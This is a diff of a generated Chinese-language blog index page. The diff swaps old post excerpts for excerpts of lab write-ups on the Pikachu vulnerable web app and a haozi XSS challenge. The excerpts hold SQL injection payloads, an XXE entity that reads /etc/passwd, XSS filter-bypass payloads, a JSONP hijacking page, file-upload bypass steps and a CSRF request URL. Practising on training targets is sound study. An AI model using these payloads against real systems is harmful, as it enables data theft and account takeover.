@@ -367,20 +367,20 @@ height:50vh;
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" >
+        <a class="abstract-title" href = "/2020/03/21/Pikachu-SQL%E6%B3%A8%E5%85%A5(%E4%B8%89)/" >
             
-                <span>代码审计 | 变量覆盖</span>
+                <span>Pikachu-SQL注入(三)</span>
         </a>
         <div class="abstract-content">
-            代码审计 | 变量覆盖什么是变量覆盖漏洞？用户自定义传入的变量可以将代码中原有变量的数值进行覆盖修改
-变量覆盖的常见情况
-$$/foreach()函数使用不当
-extract()函数使用不当
-parse_str()函数使用不当
-import_request_variables()使用不当，开启了全局变量注册
+            Pikachu-SQL注入(三)http-header注入先抓包，测试是否存在注入点用给的账号密码进行登录我们用user-agent进行测试，将内容删去，用单引号进行测试。
 
-$$使用不当导致变量覆盖漏洞$$，这种写法称为可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。
-1234567&lt;?php$a = "hello";echo "$a";              //输出hello$a="world";echo "$a";...
+单引号测试报错，证明这里存在SQL注入漏洞后台应该是用insert语句进行的拼接，所以我们直接拿insert注入的payload进行测试
+1&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;
+
+
+成功爆出数据库名，接下来就是表名
+payload：
+1&#39; or updatexml(1,concat(0x7e,(SELECT concat(table...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -398,13 +398,24 @@ $$使用不当导致变量覆盖漏洞$$，这种写法称为可变变量，一�
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" >
+        <a class="abstract-title" href = "/2020/03/21/Pikachu-SQL%E6%B3%A8%E5%85%A5(%E4%BA%8C)/" >
             
-                <span>代码审计 | 序列化与反序列化漏洞</span>
+                <span>Pikachu-SQL注入(二)</span>
         </a>
         <div class="abstract-content">
-            代码审计 | 序列化与反序列化漏洞什么是序列化？什么是反序列化？通俗的讲，序列化就是将变量转化为可以传输的字符串，反序列化就是将字符串转回变量的过程。一般都围绕着serialize()和unserialize()两个函数展开。
-1234567891011121314&lt;?php  class delete  &#123;  	public $filename = 'error';  &#125;   $test = new delete();  $test -&gt; filename = 'flag.txt';   echo serialize($test);?&gt; 输出结果：...
+            Pikachu-SQL注入(二)xx型注入先用1’进行测试，返回所以我们不难猜测，在和后台交互的SQL注入语句中，参数的闭合方式为(‘$id’)我们构造如下语句进行测试，发现返回正常
+11&#39;) or 1&#x3D;1#
+可以判断我们的猜想正确
+由之前的可知字段数为2
+11&#39;) order by 2#
+回显点
+11&#39;) union select 1,2#
+
+数据库名
+11&#39;) union select 1,database()#
+
+表名、列名
+11&#39;) union select 1,group_concat(table_name) from info...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -422,25 +433,207 @@ $$使用不当导致变量覆盖漏洞$$，这种写法称为可变变量，一�
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2020/03/21/%E6%97%A5%E8%AF%AD%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/" >
+        <a class="abstract-title" href = "/2020/03/21/Pikachu-SQL%E6%B3%A8%E5%85%A5/" >
             
-                <span>日语基础学习(一)</span>
+                <span>Pikachu-SQL注入</span>
         </a>
         <div class="abstract-content">
-            日语基础学习(一)了解日语日语的组成可以分为三部分 
+            Pikachu-SQL注入POST注入首先随便选，然后抓个包用order by 判断字段数
+我们得到字段数为2接着，我们爆出回显点
+payload:
+1id=1 and 1=2 union select 1,2 --+
+然后爆出数据库名和版本
+数据库名pikachu，版本为5.5.47payload:
+1id&#x3D;1 and 1&#x3D;2 union select database(),version() --+
+爆表名
+得到数据表httpinfomembermessageusersxssblind
+payload：
+1id&#x3D;1 and 1&#x3D;2 union ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/21</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/03/21/Pikachu-xxe/" >
+            
+                <span>Pikachu-xxe</span>
+        </a>
+        <div class="abstract-content">
+            Pikachu-xxe我们直接提交我们自定义的一个实体
+1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE poem [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt;&lt;poem&gt;  &amp;xxe;&lt;&#x2F;poem&gt;
+有一点需要注意这里是经过URL编码的,因为burp会自动帮我们编码,如果使用其他代理软...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/21</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/03/21/Pikachu-jsonp/" >
+            
+                <span>Pikachu-jsonp</span>
+        </a>
+        <div class="abstract-content">
+            Pikachu-jsonpjsonp劫持进来就发现了我们的json信息参照昨天CSRF的经验，我们也可以构造恶意网页去获得受害者的json信息
+12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;JSONP劫持测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type="text/javascript"&gt;function test(result)        &#...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/21</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/03/21/Pikachu-XSS/" >
+            
+                <span>Pikachu-XSS</span>
+        </a>
+        <div class="abstract-content">
+            Pikachu-XSSXSS之盲打先提交我们的XSS留言进后台看一下看到我们的提交的XSS因为管理员查看留言板而被触发，我们就可以通过这样来获取管理员的cookie
+XSS之过滤测试过滤情况script被过滤，测试大小写混拼和双写成功出发XSSpayload
+1&lt;SCRIPT&gt;alert(/xss/)&lt;/sCRIpt&gt;
 
-假名
-汉字
-罗马字
+XSS之htmlspecialchars从题目可以看出应该是htmlspecialchars($name)的形式这里我们来说一下htmlspecialchars这个函数
+1htmlspecialchars(string,flags,charact...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/21</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/03/21/Pikachu-upload/" >
+            
+                <span>Pikachu-upload</span>
+        </a>
+        <div class="abstract-content">
+            Pikachu-upload任意文件上传没啥过滤,可随意上传
+JS限制文件上传有上传文件类型的过滤
+抓包,修改文件名后缀成功上传
+MIME限制文件上传MIME验证就是检测Content-type字段值的，直接更改上传数据包中的Content-type即可绕过
+扩展名限制文件上传不允许上传.php文件,考虑上传截断修改hex值,将2b -&gt; 00,进行截断
+成功上传
+内容限制文件上传还是不允许上传.php文件,尝试上传图片.成功上传并返回图片信息
+1Array ( [0] &#x3D;&gt; 955 [1] &#x3D;&gt; 955 [2] &#x3D;&gt; 2 [3] &...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/21</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/03/21/Pikachu-SSRF/" >
+            
+                <span>Pikachu-SSRF</span>
+        </a>
+        <div class="abstract-content">
+            Pikachu-SSRFcurl线上环境坏了，我们先通过file_get_content来把curl型的源码读取出来
+1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?php/** * Created by runner.han * There is nothing new under the sun */$SELF_PAGE = substr($_SE...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/21</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/03/21/Pikachu-CSRF/" >
+            
+                <span>Pikachu-CSRF</span>
+        </a>
+        <div class="abstract-content">
+            Pikachu-CSRFget型CSRF先看提示，登陆上来看到可以修改个人信息，估计就是在这里存在CSRF。修改个人信息，然后抓取数包。
+我们对包内容进行修改，将地址改为真新镇看到地址已经被我们修改了所以我们只需要构造
+1222.186.175.249:10000&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;test&amp;phonenum&#x3D;18888888888&amp;add&#x3D;zhenxinzhen&amp;email&#x3D;xiaobaicai%4...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/21</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/" >
+            
+                <span>haozi XSS平台WriteUP</span>
+        </a>
+        <div class="abstract-content">
+            haozi XSS平台WriteUP0x00看源码，没有丝毫过滤
+123function render (input) &#123;  return '&lt;div&gt;' + input + '&lt;/div&gt;'&#125;
+所以直接用最简单的payload
+1&lt;script&gt;alert(1);&lt;/script&gt;
 
-例如
-1234567蜡笔小新クレヨン新ちゃんクレヨン(片假名)新(汉字)ちゃん(平假名)
-
-汉字中国的汉字经过朝鲜半岛,传入日本,有一部分被日语保留下来,我们学习起来也比较方便,但是需要注意的是,部分汉字在日语中的意思发生了变化.
-123&#x2F;&#x2F;日语丈夫 --&gt; 结实爱人 --&gt; 情人、第三者(贬义色彩)
-假名假名,也就是借来的,古文中有假借的词,日语同义.平假名和片假名,都来源于汉字.只是变化之后保留的部分不同.
-
-平假名平假名,将汉字进行平易化、简单化之后演变而来的假名.在书写中...
+0x01123function render (input) &#123;  return '&lt;textarea&gt;' + input + '&lt;/textarea&gt;'&#125;
+我们看到，相比上一关，闭合的标签改变...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -453,6 +646,10 @@ $$使用不当导致变量覆盖漏洞$$，这种写法称为可变变量，一�
     </article>
     
     <!-- paginator  -->
+    
+    <nav class="page-nav">
+        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">NEXT &gt;</a>
+    </nav>
     
 </main>
             <!-- profile -->
@@ -677,9 +874,174 @@ $$使用不当导致变量覆盖漏洞$$，这种写法称为可变变量，一�
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 3
+        Total : 18
         </div>
         <!-- search  -->
         
@@ -724,6 +1086,189 @@ $$使用不当导致变量覆盖漏洞$$，这种写法称为可变变量，一�
     
         <li class="archive-post-item">
             <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/%E6%97%A5%E8%AF%AD%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/" >日语基础学习(一)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-upload/" >Pikachu-upload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-SSRF/" >Pikachu-SSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-SQL%E6%B3%A8%E5%85%A5(%E4%B8%89)/" >Pikachu-SQL注入(三)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-CSRF/" >Pikachu-CSRF</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-SQL%E6%B3%A8%E5%85%A5(%E4%BA%8C)/" >Pikachu-SQL注入(二)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-SQL%E6%B3%A8%E5%85%A5/" >Pikachu-SQL注入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-XSS/" >Pikachu-XSS</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-jsonp/" >Pikachu-jsonp</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-xxe/" >Pikachu-xxe</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" >Pikachu-命令执行</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" >Pikachu-文件包含</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" >Pikachu-文件泄露</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-%E8%AF%BB%E5%8F%96/" >Pikachu-读取</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-%E8%B6%8A%E6%9D%83/" >Pikachu-越权</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/" >haozi XSS平台WriteUP</a>
         </li>
     
     </div>
